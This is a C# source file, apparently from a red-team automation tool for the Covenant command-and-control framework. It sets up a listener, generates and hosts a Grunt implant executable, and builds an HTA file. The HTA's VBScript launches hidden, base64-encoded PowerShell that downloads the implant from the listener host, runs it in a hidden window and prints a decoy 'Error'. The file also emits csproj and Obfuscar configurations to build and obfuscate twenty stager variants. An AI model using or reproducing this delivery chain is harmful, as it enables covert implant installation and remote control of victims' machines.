
using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using McMaster.Extensions.CommandLineUtils;
using Covenant.API;
using Covenant.API.Models;
using System.Net.Http;
using Scorpion.Exceptions;
using Scorpion.Jobs;
using Scorpion.Api;

namespace Scorpion.Jobs
{
  public class SetupJob : Job
  {
    public int TargetPort = 8080;
    public SetupJob(IConsole console, CovenantAPI api) : base(console, api) { }

    public async Task<int> RunAsync(string connectAddress)
    {
      Console.WriteLine("Creating Data directories");
      var pwd = Directory.GetCurrentDirectory();
      var dataDir = Path.Join(pwd, "Data");
      if (!Directory.Exists(dataDir)) {
        Directory.CreateDirectory(dataDir);
      }
      Console.WriteLine("Creating Listener");
      HttpListener listener = await CreateListener(connectAddress);
      Console.WriteLine("Creating Basic HTTP Grunt Binary");
      BinaryLauncher defaultHttpLauncher = await GenerateBasicHttpGruntBinary(listener);
      var rawBin = Convert.FromBase64String(defaultHttpLauncher.Base64ILByteString);
      var defaultHttpBinPath = Path.Join(dataDir, "default.exe");
      Console.WriteLine("Saving HTTP Grunt Binary");
      File.WriteAllBytes(defaultHttpBinPath, rawBin);
      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
      var hostedDefaultHttpBin = new HostedFile();
      hostedDefaultHttpBin.ListenerId = listener.Id;
      hostedDefaultHttpBin.Path = "/default.exe";
      //   b64 encoded
      hostedDefaultHttpBin.Content = defaultHttpLauncher.Base64ILByteString;
      var request = new RequestBuilder(Api);
      Console.WriteLine("Creating Hosted HTTP Grunt Binary");
      await request.CreateHostedFile((int)listener.Id, hostedDefaultHttpBin);
      Console.WriteLine("Generating HTA Script That Dowloands/Execs Default Grunt Binary");
      var htaToDownloadAndExecBin = GeneratePowershellBinaryPullAndExecCmd(listener, hostedDefaultHttpBin);
      Console.WriteLine("Hosting HTA Script That Dowloands/Execs Default Grunt Binary");
      var hostedHtaToDownloadAndExecBin = new HostedFile();
      hostedHtaToDownloadAndExecBin.ListenerId = listener.Id;
      hostedHtaToDownloadAndExecBin.Path = "/default.hta";
      hostedHtaToDownloadAndExecBin.Content = Convert.ToBase64String(Encoding.ASCII.GetBytes(htaToDownloadAndExecBin));
      var defaultHttpHtaPath = Path.Join(dataDir, "default.hta");
      Console.WriteLine("Saving HTA Script That Dowloands/Execs Default Grunt Binary");
      File.WriteAllBytes(defaultHttpHtaPath, Encoding.ASCII.GetBytes(htaToDownloadAndExecBin));

      for (int i = 0; i < 20; i++) {
        var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
        Console.WriteLine($"Generating csproj for {aGuid}");

        var csproj = GenerateCsprojFile(aGuid, dataDir);
        var csprojName = aGuid + ".csproj";
        var csprojPath = Path.Join(dataDir, csprojName);
        Console.WriteLine($"Saving csproj for {aGuid}");
        File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));

        Console.WriteLine($"Generating Obfuscar for {aGuid}");
        var obfuscar = GenerateObfuscarFile(aGuid, dataDir);
        var obfuscarName = aGuid + ".xml";
        var obfuscarPath = Path.Join(dataDir, obfuscarName);
        Console.WriteLine($"Saving Obfuscar for {aGuid}");
        File.WriteAllBytes(obfuscarPath, Encoding.ASCII.GetBytes(obfuscar));
        // TODO: need to implement implant functionality to find the correct implant template
        // for smb
      }
      //  generate multiple smb binaries 
      //   download code and embed in visual studio projects
      //   build locally and obfuscate
      //   upload as hosted files
      return await Task.FromResult(0);
    }

    public string GeneratePowershellBinaryPullAndExecCmd(HttpListener listener, HostedFile hostedFile)
    {
      // TODO: make sure path starts with /
      var script = string.Format(@"
$loc = ""\Users\Public\Downloads\app-"" + (Get-Date).ToString(""yyyyMMddHHmmss"") + "".exe"";
(New-Object Net.WebClient).DownloadFile('http://{0}{1}', $loc);
Start-Process -FilePath $loc -WindowStyle Hidden;
Write-Output ""Error"";
", listener.ConnectAddresses[0], hostedFile.Path);
      var covertedScript = Encoding.GetEncoding("UTF-16LE").GetBytes(script);
      var encodedScript = Convert.ToBase64String(covertedScript);
      var hta = string.Format(@"
<script language=""VBScript"" >
    Function DoStuff()
        Dim wsh
        Set wsh = CreateObject(""Wscript.Shell"")
        wsh.run ""powershell - Sta - Nop - Window Hidden - EncodedCommand {0}""
        set wsh = Nothing
     End Function
     DoStuff
     self.close
</script>", encodedScript);
      return hta;
    }

    public async Task<BinaryLauncher> GenerateBasicHttpGruntBinary(HttpListener listener)
    {
      var request = new RequestBuilder(Api);

      var bin = new BinaryLauncher();
      bin.ListenerId = listener.Id;
      bin.Name = "DefaultHttpBin";
      bin.Description = "Default HTTP Binary";
      bin.DotNetFrameworkVersion = DotNetVersion.Net40;
      bin.Type = LauncherType.Wmic;
      bin.ImplantTemplateId = 1;
      bin.ValidateCert = true;
      bin.UseCertPinning = true;
      bin.SmbPipeName = "doesnotmatter";
      bin.JitterPercent = 10;
      bin.Delay = 1;
      bin.ConnectAttempts = 5000;
      var kd = new DateTime();
      kd.AddDays(60);
      bin.KillDate = kd;
      bin.LauncherString = "";
      bin.StagerCode = "";
      bin.Base64ILByteString = "";
      bin.OutputKind = OutputKind.ConsoleApplication;
      bin.CompressStager = true;
      return await request.CreateBinaryLauncher(bin);

      // Id=1
      // Type=Binary
      // Description=Uses+a+generated+.NET+Framework+binary+to+launch+a+Grunt.
      // ListenerId=1
      // ImplantTemplateId=1 # GruntHTTP
      // ValidateCert=True
      // UseCertPinning=True
      // SMBPipeName=gruntsvc
      // Delay=5
      // JitterPercent=10
      // ConnectAttempts=5000
      // KillDate=12%2F31%2F2020+12%3A00+AM
      // DotNetFrameworkVersion=0
      // LauncherString=
      // StagerCode=
      // Base64ILByteString=
    }

    public async Task<HttpListener> CreateListener(string connectAddress)
    {
      var connectAddresses = new List<string>();
      connectAddresses.Add(connectAddress);
      var urls = new List<string>();
      urls.Add($"http://{connectAddress}");

      return await new AddListenerJob(Console, Api).RunAsync(new
      {
        Name = "default",
        Description = "Default Listener",
        Guid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
        BindAddress = "0.0.0.0",
        BindPort = TargetPort,
        Urls = urls,
        ConnectAddresses = connectAddresses,
        ConnectPort = TargetPort,
        ProfileId = 0,
        ProfileName = "CustomHttpProfile",
        ListenerTypeId = 0,
        ListenerTypeName = "HTTP",
        Status = "Active",
        UseSSL = false,
        SSLCertificate = "",
        SSLCertificatePassword = "",
        SSLCertificateHash = ""
      });
    }

    public string GenerateObfuscarFile(string aGuid, string dataDir)
    {
      var obfuscarXml = String.Format(@"
<?xml version=""1.0"" encoding=""utf-8""?>
<Obfuscator>
	<Var name=""InPath"" value=""."" />
	<Var name=""OutPath"" value=""{1}"" />
	<Var name=""KeepPublicApi"" value=""false"" />
	<Var name=""HidePrivateApi"" value=""true"" />
	<Module file=""{1}"" />
</Obfuscator>", dataDir, Path.Join(dataDir, aGuid + ".exe"));
      return obfuscarXml;
    }


    public string GenerateCsprojFile(string aGuid, string dataDir)
    {
      var csproj = String.Format(@"
<?xml version=""1.0"" encoding=""utf-8""?>
<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Import Project=""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"" />
  <PropertyGroup>
    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>
    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>
    <ProjectGuid>{{70FD0877-6515-4D14-B830-AA470E7C1AFD}}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>GruntStager</RootNamespace>
    <AssemblyName>GruntStager</AssemblyName>
    <TargetName>{0}</TargetName>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <Deterministic>true</Deterministic>
    <NuGetPackageImportStamp>
    </NuGetPackageImportStamp>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>{1}</OutputPath>
    <DefineConstants>DEBUG;TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "">
    <PlatformTarget>x64</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>{1}</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System"" />
    <Reference Include=""System.Core"" />
    <Reference Include=""System.Xml.Linq"" />
    <Reference Include=""System.Data.DataSetExtensions"" />
    <Reference Include=""Microsoft.CSharp"" />
    <Reference Include=""System.Data"" />
    <Reference Include=""System.Xml"" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include=""Program.cs"" />
    <Compile Include=""Properties\AssemblyInfo.cs"" />
  </ItemGroup>
  <ItemGroup>
    <None Include=""packages.config"" />
  </ItemGroup>
  <Import Project=""$(MSBuildToolsPath)\Microsoft.CSharp.targets"" />
  <Target Name=""EnsureNuGetPackageBuildImports"" BeforeTargets=""PrepareForBuild"">
    <PropertyGroup>
      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {{{{0}}.</ErrorText>
    </PropertyGroup>
  </Target>
</Project>", aGuid, dataDir);
      return csproj;
    }
  }
}
